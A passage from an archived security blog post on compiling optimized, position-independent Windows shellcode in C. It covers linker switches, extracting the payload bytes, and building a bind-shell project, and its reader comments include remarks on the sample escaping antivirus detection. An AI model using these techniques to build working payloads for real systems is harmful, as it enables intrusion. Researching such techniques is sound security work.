+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;">/LTCG /ENTRY:"ExecutePayload" /OPT:REF /SAFESEH:NO /SUBSYSTEM:CONSOLE /MAP /ORDER:@"function_link_order.txt" /OPT:ICF /NOLOGO /NODEFAULTLIB</span><br>
+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;"></span><br>
+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;">/LTCG "x64\Release\\AdjustStack.obj" /ENTRY:"Begin" /OPT:REF /SAFESEH:NO /SUBSYSTEM:CONSOLE /MAP /ORDER:@"function_link_order64.txt" /OPT:ICF /NOLOGO /NODEFAULTLIB</span><br>
+<br>
+Each switch warrants an explanation as it is relevant to the shellcode that will be generated.<br>
+<br>
+/LTCG: Enables global optimizations by the linker. The compiler has little to no control over optimizations across function calls since it compiles on a function-by-function basis. Therefore, the linker is ideally suited to perform optimizations across function calls since it receives all of the object files emitted by the compiler.<br>
+<br>
+/ENTRY: Specifies the entry point of the binary. This is “ExecutePayload” (the bind shell logic) in x86 and ARM. However, in x86_64, it is “Begin” – the call to the stack alignment stub – “AlignRSP”. The reason the “Begin” function is necessary in 64BitHelper.h is because since&nbsp;we’re eventually emitting shellcode, we have to explicitly set the link order (via the /ORDER switch). The Microsoft linker doesn’t allow you to specify link order for extern functions (i.e. AlignRSP). To get around this, I simply wrapped AlignRSP in a function. “Begin” is then specified as the first function to be linked. That way, it will be the first code to be called in the shellcode.<br>
+<br>
+/OPT:REF: Eliminates functions and/or data that are never referenced. We want our shellcode to be as small as possible. This linker optimization will reduce shellcode size by eliminating dead code/data.<br>
+<br>
+/SAFESEH:NO: Do not emit SafeSEH handlers. Shellcode has no need for registered exception handling.<br>
+<br>
+/SUBSYSTEM:CONSOLE: As far as shellcode goes, the subsystem is irrelevant. Specifying “CONSOLE” though will allow you to test the compiled exe from the command line.<br>
+<br>
+/MAP: Generate a map file. This file is used to pull out the size of the shellcode.<br>
+<br>
+/ORDER: Because we are generating shellcode, the order in which functions are linked is extremely important. Originally, it was my assumption that the entry point function would be the first function to be linked. This, however, did not turn out to be the case. The /ORDER switch takes a text file containing the functions in the order in which they should be linked. You’ll notice that the function at the top of each list is the entry point function.<br>
+<br>
+/OPT:ICF: Removes redundant functions. This is optional.<br>
+<br>
+/NODEFAULTLIB: Explicitly tells the linker not to attempt to use default libraries when resolving external references. This switch is handy if you accidentally have an external reference in your code. The linker will throw an error which will bring to your attention the fact that your payload cannot have any external references!<br>
+<br>
+<strong><u><span style="font-size: large;">Extracting the Shellcode</span></u></strong><br>
+<br>
+After the code is compiled and linked, the final step is to pull the shellcode out of the resulting exe. This requires a tool that can parse a PE file and pull the bytes out of the .text section. Fortunately, <a href="https://web.archive.org/web/20210305190309/https://github.com/mattifestation/PowerSploit/tree/master/PETools" target="_blank">Get-PEHeader</a> already does this. The only caveat though is that if you were to pull out the entire .text section, you would be left with a bunch of null padding. That’s why I wrote another script that parses the map file which contains the actual length of the code in the .text section.<br>
+<br>
+For those who enjoy analyzing PE files, it is worth investigating the exe files generated. It will only contain a single section - .text and it will not have any entries in the data directories in the optional header. This is exactly what I&nbsp;sought after&nbsp;– a binary without any relocations, extraneous sections, or imports.<br>
+<br>
+<strong><u><span style="font-size: large;">Build Steps: PIC_Bindshell</span></u></strong><br>
+<br>
+<a href="https://web.archive.org/web/20210305190309/https://github.com/mattifestation/PIC_Bindshell" target="_blank">PIC_Bindshell.zip</a> includes a Visual Studio 2012 project. I tested it on both VS2012 Express and Ultimate Edition. Just load the solution file (*.sln) in Visual Studio, select the architecture you want to target, and then build. What is output is an exe and a shellcode (*.bin) payload.<br>
+<br>
+The Express Edition of Visual Studio 2012 does not support compiling for ARM. Also, if this is your first time compiling for ARM, Visual Studio will throw the following error upon attempting to compile:<br>
+<br>
+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;">C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\V110\Platforms\ARM\PlatformToolsets\v110\Microsoft.Cpp.ARM.v110.targets(36,5): error MSB8022: Compiling Desktop applications for the ARM platform is not supported.</span><br>
+<br>
+You also need to remove the following line from “C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\includecrtdefs.h” (338):<br>
+<br>
+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;">#error Compiling Desktop applications for the ARM platform is not supported.</span><br>
+<br>
+Simply remove those lines, restart Visual Studio, and then you’ll be good to go.<br>
+<br>
+<strong><u><span style="font-size: large;">Conclusion</span></u></strong><br>
+<br>
+With a clearer understanding of how the Microsoft compiler and linker work in concert, it is possible to write fully optimized Windows shellcode in C that can be targeted to any supported processor architecture. That doesn’t mean that you shouldn’t have a clear understanding of the assembly language you’re targeting, though. It just means you don’t have to waste cycles writing large quantities of assembly language by hand. Also, I’ll trust the compiler over my feeble brain any day.<br>
+<br>
+BTW, my 64-bit shellcode uses XMM registers. Does yours? :P<br>
+<br>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://web.archive.org/web/20210305190309/http://3.bp.blogspot.com/-eEf1AMNqI4o/Ug6uHDAdU7I/AAAAAAAAAOY/gvcS7DibrMA/s1600/x64_Optimized.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="./Writing Optimized Windows Shellcode in C_files/x64_Optimized.png"></a></div>
+<div style="clear: both;"></div>
+</div>
+<div class="post-footer">
+<div class="post-footer-line post-footer-line-1"><span class="post-author vcard">
+</span>
+<span class="post-timestamp">
+</span>
+<span class="post-comment-link">
+</span>
+<span class="post-icons">
+</span>
+<div class="post-share-buttons goog-inline-block">
+</div>
+</div>
+<div class="post-footer-line post-footer-line-2"><span class="post-labels">
+Labels:
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search/label/compiling" rel="tag">compiling</a>,
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search/label/linking" rel="tag">linking</a>,
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search/label/powershell" rel="tag">powershell</a>,
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search/label/shellcode" rel="tag">shellcode</a>,
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/search/label/Visual%20Studio" rel="tag">Visual Studio</a>
+</span>
+</div>
+<div class="post-footer-line post-footer-line-3"><span class="post-location">
+</span>
+</div>
+</div>
+</div>
+<div class="comments" id="comments">
+<a name="comments"></a>
+<h4>12 comments:</h4>
+<div class="comments-content">
+<script async="async" src="./Writing Optimized Windows Shellcode in C_files/writing-optimized-windows-shellcode-in-c.html" type="text/javascript"></script>
+<script type="text/javascript">
+    (function() {
+      var items = null;
+      var msgs = null;
+      var config = {};
+
+// <![CDATA[
+      var cursor = null;
+      if (items && items.length > 0) {
+        cursor = parseInt(items[items.length - 1].timestamp) + 1;
+      }
+
+      var bodyFromEntry = function(entry) {
+        var text = (entry &&
+                    ((entry.content && entry.content.$t) ||
+                     (entry.summary && entry.summary.$t))) ||
+            '';
+        if (entry && entry.gd$extendedProperty) {
+          for (var k in entry.gd$extendedProperty) {
+            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
+              return '<span class="deleted-comment">' + text + '</span>';
+            }
+          }
+        }
+        return text;
+      }
+
+      var parse = function(data) {
+        cursor = null;
+        var comments = [];
+        if (data && data.feed && data.feed.entry) {
+          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
+            var comment = {};
+            // comment ID, parsed out of the original id format
+            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
+            comment.id = id ? id[2] : null;
+            comment.body = bodyFromEntry(entry);
+            comment.timestamp = Date.parse(entry.published.$t) + '';
+            if (entry.author && entry.author.constructor === Array) {
+              var auth = entry.author[0];
+              if (auth) {
+                comment.author = {
+                  name: (auth.name ? auth.name.$t : undefined),
+                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
+                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
+                };
+              }
+            }
+            if (entry.link) {
+              if (entry.link[2]) {
+                comment.link = comment.permalink = entry.link[2].href;
+              }
+              if (entry.link[3]) {
+                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
+                if (pid && pid[1]) {
+                  comment.parentId = pid[1];
+                }
+              }
+            }
+            comment.deleteclass = 'item-control blog-admin';
+            if (entry.gd$extendedProperty) {
+              for (var k in entry.gd$extendedProperty) {
+                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
+                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
+                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
+                  comment.displayTime = entry.gd$extendedProperty[k].value;
+                }
+              }
+            }
+            comments.push(comment);
+          }
+        }
+        return comments;
+      };
+
+      var paginator = function(callback) {
+        if (hasMore()) {
+          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
+          if (cursor) {
+            url += '&published-min=' + new Date(cursor).toISOString();
+          }
+          window.bloggercomments = function(data) {
+            var parsed = parse(data);
+            cursor = parsed.length < 50 ? null
+                : parseInt(parsed[parsed.length - 1].timestamp) + 1
+            callback(parsed);
+            window.bloggercomments = null;
+          }
+          url += '&callback=bloggercomments';
+          var script = document.createElement('script');
+          script.type = 'text/javascript';
+          script.src = url;
+          document.getElementsByTagName('head')[0].appendChild(script);
+        }
+      };
+      var hasMore = function() {
+        return !!cursor;
+      };
+      var getMeta = function(key, comment) {
+        if ('iswriter' == key) {
+          var matches = !!comment.author
+              && comment.author.name == config.authorName
+              && comment.author.profileUrl == config.authorUrl;
+          return matches ? 'true' : '';
+        } else if ('deletelink' == key) {
+          return config.baseUri + '/delete-comment.g?blogID='
+               + config.blogId + '&postID=' + comment.id;
+        } else if ('deleteclass' == key) {
+          return comment.deleteclass;
+        }
+        return '';
+      };
+
+      var replybox = null;
+      var replyUrlParts = null;
+      var replyParent = undefined;
+
+      var onReply = function(commentId, domId) {
+        if (replybox == null) {
+          // lazily cache replybox, and adjust to suit this style:
+          replybox = document.getElementById('comment-editor');
+          if (replybox != null) {
+            replybox.height = '250px';
+            replybox.style.display = 'block';
+            replyUrlParts = replybox.src.split('#');
+          }
+        }
+        if (replybox && (commentId !== replyParent)) {
+          replybox.src = '';
+          document.getElementById(domId).insertBefore(replybox, null);
+          replybox.src = replyUrlParts[0]
+              + (commentId ? '&parentID=' + commentId : '')
+              + '#' + replyUrlParts[1];
+          replyParent = commentId;
+        }
+      };
+
+      var hash = (window.location.hash || '#').substring(1);
+      var startThread, targetComment;
+      if (/^comment-form_/.test(hash)) {
+        startThread = hash.substring('comment-form_'.length);
+      } else if (/^c[0-9]+$/.test(hash)) {
+        targetComment = hash.substring(1);
+      }
+
+      // Configure commenting API:
+      var configJso = {
+        'maxDepth': config.maxThreadDepth
+      };
+      var provider = {
+        'id': config.postId,
+        'data': items,
+        'loadNext': paginator,
+        'hasMore': hasMore,
+        'getMeta': getMeta,
+        'onReply': onReply,
+        'rendered': true,
+        'initComment': targetComment,
+        'initReplyThread': startThread,
+        'config': configJso,
+        'messages': msgs
+      };
+
+      var render = function() {
+        if (window.goog && window.goog.comments) {
+          var holder = document.getElementById('comment-holder');
+          window.goog.comments.render(holder, provider);
+        }
+      };
+
+      // render now, or queue to render when library loads:
+      if (window.goog && window.goog.comments) {
+        render();
+      } else {
+        window.goog = window.goog || {};
+        window.goog.comments = window.goog.comments || {};
+        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
+        window.goog.comments.loadQueue.push(render);
+      }
+    })();
+// ]]>
+  </script>
+<div id="comment-holder">
+<div class="comment-thread toplevel-thread"><ol id="top-ra"><li class="comment" id="c1447722306766526503"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/blank.gif" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user">Anonymous</cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376702966399#c1447722306766526503">August 16, 2013 at 9:29 PM</a></span></div><p class="comment-content">Beware of switch statements - the compiler can optimise them to use a global variable (switch table).</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="1447722306766526503" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-656209810"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=1447722306766526503">Delete</a></span></span></div><div class="comment-replies"><div id="c1447722306766526503-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c1447722306766526503-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c4818192281358084484"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/struggle.jpg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/02692973807909017107" rel="nofollow">Matt Graeber</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376703299425#c4818192281358084484">August 16, 2013 at 9:34 PM</a></span></div><p class="comment-content">Interesting. I'll be on the lookout. Thanks for the tip. :)<br><br>The techniques I've described as you probably know are by no means a silver bullet and manual validation will still be necessary. The compiler is complicated beyond by comprehension.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-743668834"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=4818192281358084484">Delete</a></span></span></div><div class="comment-replies"><div id="c4818192281358084484-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c4818192281358084484-ra" class="thread-chrome thread-expanded"><div></div><div id="c4818192281358084484-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="4818192281358084484" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c4818192281358084484-ce"></div></li></div><div id="c1447722306766526503-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="1447722306766526503" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c1447722306766526503-ce"></div></li><li class="comment" id="c3598544777407114681"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/Or1b9fB6.jpeg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/06863658324274536723" rel="nofollow">tiraniddo</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376734129376#c3598544777407114681">August 17, 2013 at 6:08 AM</a></span></div><p class="comment-content">One way you can sort of get position independent constant strings is you can merge the .rdata section into the .text section (using /merge:.rdata=.text linker flag) then use a stub function which gets the current EIP and and calculates the string location. The nice thing about this is it can become a no-op on x64 because the compiler will emit RIP relative instructions. <br></p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="3598544777407114681" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-105967120"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=3598544777407114681">Delete</a></span></span></div><div class="comment-replies"><div id="c3598544777407114681-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c3598544777407114681-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c7387260628952309718"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/struggle.jpg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/02692973807909017107" rel="nofollow">Matt Graeber</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376739564864#c7387260628952309718">August 17, 2013 at 7:39 AM</a></span></div><p class="comment-content">Hey James. I played around with merging sections a bit when I was developing these techniques. I ultimately opted not to merge sections though since the compiler still emits relocations. And while I have the toolset (Get-ObjDump) to list and modify relocations, I'd much rather leave that task to the linker. I'll admit though, using char arrays is pretty annoying.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-743668834"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=7387260628952309718">Delete</a></span></span></div><div class="comment-replies"><div id="c7387260628952309718-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c7387260628952309718-ra" class="thread-chrome thread-expanded"><div></div><div id="c7387260628952309718-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="7387260628952309718" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c7387260628952309718-ce"></div></li><li class="comment" id="c457166285646176606"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/Or1b9fB6.jpeg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/06863658324274536723" rel="nofollow">tiraniddo</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376741998176#c457166285646176606">August 17, 2013 at 8:19 AM</a></span></div><p class="comment-content">Perhaps the MS compilers have changed somewhat since I last actually wrote C shellcode, was over 3 years ago now :) Still what I recall on x86 it would generate relocations, but as long as you bounce through a re-basing function it didn't matter if you just discarded the relocations afterwards. And I recall x64 just always generated RIP relative, but again maybe not any more.<br><br>Still it is a good article :)</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-105967120"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=457166285646176606">Delete</a></span></span></div><div class="comment-replies"><div id="c457166285646176606-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c457166285646176606-ra" class="thread-chrome thread-expanded"><div></div><div id="c457166285646176606-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="457166285646176606" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c457166285646176606-ce"></div></li></div><div id="c3598544777407114681-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="3598544777407114681" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c3598544777407114681-ce"></div></li><li class="comment" id="c7930304546939981633"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/blank.gif" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user">Marqo09</cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1376800269181#c7930304546939981633">August 18, 2013 at 12:31 AM</a></span></div><p class="comment-content">Nice job with this blog. I especially appreciate you taking the time to verbosely document. Saved me quite a bit of time not having to reference the compiler and linker switches.</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="7930304546939981633" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-656209810"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=7930304546939981633">Delete</a></span></span></div><div class="comment-replies"><div id="c7930304546939981633-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c7930304546939981633-ra" class="thread-chrome thread-expanded"><div></div><div id="c7930304546939981633-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="7930304546939981633" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c7930304546939981633-ce"></div></li><li class="comment" id="c4527496387404740929"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/blogger_logo_round_35.png" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/06057568199713436886" rel="nofollow">Thierry Franzetti</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1381406265419#c4527496387404740929">October 10, 2013 at 7:57 AM</a></span></div><p class="comment-content">Just for fun, I compiled a sample and submitted it to VirusTotal (MD5: 3cbf414a9f277991e7baaa1fa640827b). At the time of writing, the detection ratio is 3/48 ! Not bad enough for opening a bind shell...</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="4527496387404740929" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-1502787291"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=4527496387404740929">Delete</a></span></span></div><div class="comment-replies"><div id="c4527496387404740929-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c4527496387404740929-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c200860662142473533"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/struggle.jpg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/02692973807909017107" rel="nofollow">Matt Graeber</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1381453450033#c200860662142473533">October 10, 2013 at 9:04 PM</a></span></div><p class="comment-content">Have you tried submitting the 64-bit version? The sample I have on Github didn't flag at all! :) BTW, expect improvements to these techniques in the near future.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-743668834"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=200860662142473533">Delete</a></span></span></div><div class="comment-replies"><div id="c200860662142473533-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c200860662142473533-ra" class="thread-chrome thread-expanded"><div></div><div id="c200860662142473533-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="200860662142473533" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c200860662142473533-ce"></div></li></div><div id="c4527496387404740929-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="4527496387404740929" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c4527496387404740929-ce"></div></li><li class="comment" id="c869259052887930400"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/blogger_logo_round_35.png" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/11621299753234420287" rel="nofollow">Glenn</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1391759465762#c869259052887930400">February 7, 2014 at 2:51 AM</a></span></div><p class="comment-content">Nice article.<br>Just a note that your way of resolving API calls doesn't work for all API functions. Some functions such as HeapAlloc are forwarded to another dll. In this case, your resolving function returns an adress to a string with the name of the forwarded location (NTDLL.RtlAllocateHeap for AllocHeap)</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="869259052887930400" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-627132003"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=869259052887930400">Delete</a></span></span></div><div class="comment-replies"><div id="c869259052887930400-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c869259052887930400-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c2541519929184037211"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/struggle.jpg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/02692973807909017107" rel="nofollow">Matt Graeber</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1391950464953#c2541519929184037211">February 9, 2014 at 7:54 AM</a></span></div><p class="comment-content">Glenn,<br><br>That's a fantastic point and I should have mentioned that in the post. I intentionally shied away from dealing with forwarded functions since I honestly didn't have the motivation to write the logic that followed the forwarded function and resolved the function accordingly. I should at least detect when I hit a forwarded function and return null accordingly.<br><br>Thanks,<br>Matt</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-743668834"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=2541519929184037211">Delete</a></span></span></div><div class="comment-replies"><div id="c2541519929184037211-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c2541519929184037211-ra" class="thread-chrome thread-expanded"><div></div><div id="c2541519929184037211-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="2541519929184037211" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c2541519929184037211-ce"></div></li></div><div id="c869259052887930400-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="869259052887930400" href="javascript:;">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c869259052887930400-ce"></div></li><li class="comment" id="c7477859239477511706"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/blogger_logo_round_35.png" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/11621299753234420287" rel="nofollow">Glenn</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1396453371448#c7477859239477511706">April 2, 2014 at 11:42 AM</a></span></div><p class="comment-content">/GL: Whole program optimization works mostly for me. But in one piece of shellcode it caused the  error "unresolved external symbol _memcpy". I never used that function myself. <br>char *p1;<br>char *p2;<br>dword len;<br>...<br>len = ...<br>MyFunction(p1,p2,len);<br>When replacing MyFunction with <br>MyFunction(p1,p2,10);<br>The problem was solved. I rewrote the code in other ways but always i got the same error somewhere.<br>Disabeling "Whole program optimization" solved the problem, so i suppose the compiler used the memcpy somewhere to optimise my code...</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="7477859239477511706" href="javascript:;">Reply</a><span class="item-control blog-admin blog-admin pid-627132003"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=7477859239477511706">Delete</a></span></span></div><div class="comment-replies"><div id="c7477859239477511706-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol id="c7477859239477511706-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c2736938701472144255"><div class="avatar-image-container"><img src="./Writing Optimized Windows Shellcode in C_files/struggle.jpg" alt=""></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://web.archive.org/web/20210305190309/https://www.blogger.com/profile/02692973807909017107" rel="nofollow">Matt Graeber</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html?showComment=1396456939791#c2736938701472144255">April 2, 2014 at 12:42 PM</a></span></div><p class="comment-content">Thanks for letting me know. Sometimes this can be a trial and error process. For example, I was originally getting a linker error for _memset until I started using SecureZeroMemory to initialize stack variables.<br><br>One possible solution would be to implement your own version of memcpy, compile the obj file, and provide that file to the linker.<br><br>Cheers,<br>Matt</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-743668834"><a target="_self" href="https://web.archive.org/web/20210305190309/https://www.blogger.com/delete-comment.g?blogID=6052198192158185644&amp;postID=2736938701472144255">Delete</a></span></span></div><div class="comment-replies"><div id="c2736938701472144255-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self" href="javascript:;">Replies</a></span></span><ol 